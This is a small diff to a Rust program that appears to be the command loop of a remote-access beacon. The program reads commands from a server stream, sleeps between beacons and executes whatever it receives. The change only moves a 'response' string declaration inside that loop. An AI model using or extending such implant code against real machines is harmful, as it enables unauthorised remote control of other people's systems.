@@ -103,7 +103,6 @@ fn main(){
     let mut reader = BufReader::new(&stream);
     let mut writer = &stream;
     let mut line = String::new();
-    let mut response = String::from("response : ");
     let lines_server = reader.lines().fuse();
     for l in lines_server {
         line = l.unwrap();
@@ -115,6 +114,7 @@ fn main(){
             sleep_beacon(10000);
         }else{ 
             /*line.contains("command") | line.contains("target") {*/
+            let mut response = String::from("response:");
             let command = get_command(line.trim()); // return the command input without "command" and "target"
             println!("command receive is : {}", command);
             let results = execute_commands(&command);
